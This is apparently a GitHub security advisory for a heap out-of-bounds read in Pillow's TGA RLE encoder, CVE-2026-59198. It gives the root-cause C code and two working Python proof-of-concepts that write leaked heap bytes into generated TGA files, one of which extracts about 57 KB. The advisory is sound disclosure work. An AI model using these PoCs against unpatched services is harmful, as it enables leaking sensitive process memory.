# [M] Pillow TGA RLE encoder can serialize up to ~57 KB of adjacent heap data into generated images

## Summary
Severity: Medium
Advisory: GHSA-fj7v-r99m-22gq
CVE: CVE-2026-59198
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-fj7v-r99m-22gq
Type: github-advisory

## Affected
- PyPI: `Pillow` — affected >=5.2.0 <12.3.0

## Details
### Summary

Pillow's TGA RLE encoder reads past its row buffer when saving a mode `"1"`
image. Adjacent process heap bytes can be copied into the generated TGA file.

The bug is reachable through the public save API:

```python
im.save(out, format="TGA", compression="tga_rle")
```

Older affected Pillow versions use the equivalent public option `rle=True`.

For mode `"1"`, Pillow allocates a packed row buffer of `ceil(width / 8)`
bytes, but `ImagingTgaRleEncode()` treats the row as one full byte per pixel.

The maximum valid TGA width is `65535`. At that width:

```text
allocated packed row buffer: 8192 bytes
encoder byte-offset walk:     65535 bytes
maximum OOB window per row:   57343 bytes
```

On non-ASAN Pillow `12.2.0`, the public-only maximum-width PoC below serialized
`57297` bytes from distinct out-of-bounds source offsets into one returned TGA,
covering `99.92%` of the maximum adjacent heap window. No heap grooming, ctypes,
private API, or malformed input file was used. The disclosure is emitted across
many TGA packet payload copies of at most `128` bytes each, not one large
`memcpy()`.

### Details

`src/PIL/TgaImagePlugin.py` allows mode `"1"` TGA output and selects the
`tga_rle` encoder when RLE compression is requested.

`src/encode.c:_setimage()` allocates the row buffer using the packed-bit
formula:

```c
state->bytes = (state->bits * state->xsize + 7) / 8;
state->buffer = (UINT8 *)calloc(1, state->bytes);
```

For mode `"1"`, `state->bits == 1`.

`src/libImaging/TgaRleEncode.c` then computes:

```c
bytesPerPixel = (state->bits + 7) / 8;
```

This becomes `1`, and the encoder uses pixel indexes as byte offsets:

```c
static int
comparePixels(const UINT8 *buf, int x, int bytesPerPixel) {
    buf += x * bytesPerPixel;
    return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0;
}
```

The packet payload `memcpy()` later copies those out-of-bounds source bytes into
the output. Raw packets copy up to `128` contiguous bytes, while RLE packets copy
one representative byte:

```c
memcpy(
    dst, state->buffer + (state->x * bytesPerPixel - state->count), flushCount
);
```

A width-2 mode `"1"` image allocates one row byte and already triggers an ASAN
heap-buffer-overflow read. Wider images increase the adjacent heap window and
the amount of heap data that can be serialized.

### PoC

#### Minimal ASAN trigger

```python
import io
from PIL import Image

out = io.BytesIO()
Image.new("1", (2, 1)).save(out, format="TGA", compression="tga_rle")
```

Observed on local Pillow `12.3.0.dev0` ASAN target:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
comparePixels /out/src/src/libImaging/TgaRleEncode.c:10
ImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81
0 bytes after a 1-byte allocation from _setimage
```

#### Maximum-width heap disclosure

This PoC uses one maximum-width row. It parses the generated TGA packets and
extracts only payload bytes whose source offsets were outside the allocated
packed row. Rows are  avoided because they mostly repeat the same adjacent heap window.

Run the following with a standard affected Pillow installation.

```python
import hashlib
import io
import PIL
from PIL import Image

WIDTH = 65535
ATTEMPTS = 20
ROW_BYTES = (WIDTH + 7) // 8
MAX_OOB_WINDOW = WIDTH - ROW_BYTES

def extract_oob_payload(data):
    i = 18
    pixel = 0
    oob = bytearray()

    while pixel < WIDTH:
        descriptor = data[i]
        i += 1
        count = (descriptor & 0x7F) + 1

        if descriptor & 0x80:
            value = data[i]
            i += 1
            if pixel + count - 1 >= ROW_BYTES:
                oob.append(value)
        else:
            values = data[i : i + count]
            i += count
            oob.extend(values[max(ROW_BYTES - pixel, 0) :])

        pixel += count

    return bytes(oob)


best = b""

for _ in range(ATTEMPTS):
    out = io.BytesIO()
    Image.new("1", (WIDTH, 1), 0).save(out, format="TGA", compression="tga_rle")
    oob = extract_oob_payload(out.getvalue())
    if len(oob) > len(best):
        best = oob

with open("/tmp/max_oob_bytes.bin", "wb") as fp:
    fp.write(best)

print(f"Pillow={PIL.__version__}")
print(f"packed_row_bytes={ROW_BYTES}")
print(f"maximum_oob_window={MAX_OOB_WINDOW}")
print(f"serialized_distinct_oob_offsets={len(best)}")
print(f"nonzero_oob_bytes={sum(byte != 0 for byte in best)}")
print(f"coverage={len(best) / MAX_OOB_WINDOW:.2%}")
print(f"sha256={hashlib.sha256(best).hexdigest()}")
```

Observed on installed Pillow `12.2.0`:

```text
Pillow=12.2.0
packed_row_bytes=8192
maximum_oob_window=57343
serialized_distinct_oob_offsets=57297
nonzero_oob_bytes=54407
coverage=99.92%
```

### Impact

This is a heap out-of-bounds read and potential information disclosure.

A maximum-width single-row image can cause nearly the full
`57343`-byte adjacent heap window to be incorporated into one output file.

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-fj7v-r99m-22gq
- https://nvd.nist.gov/vuln/detail/CVE-2026-59198
- https://github.com/python-pillow/Pillow/pull/9709
- https://github.com/python-pillow/Pillow/commit/eada3cbd7fb9963ee90673fb7b5270124a0d5f4b
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/releases/tag/12.3.0
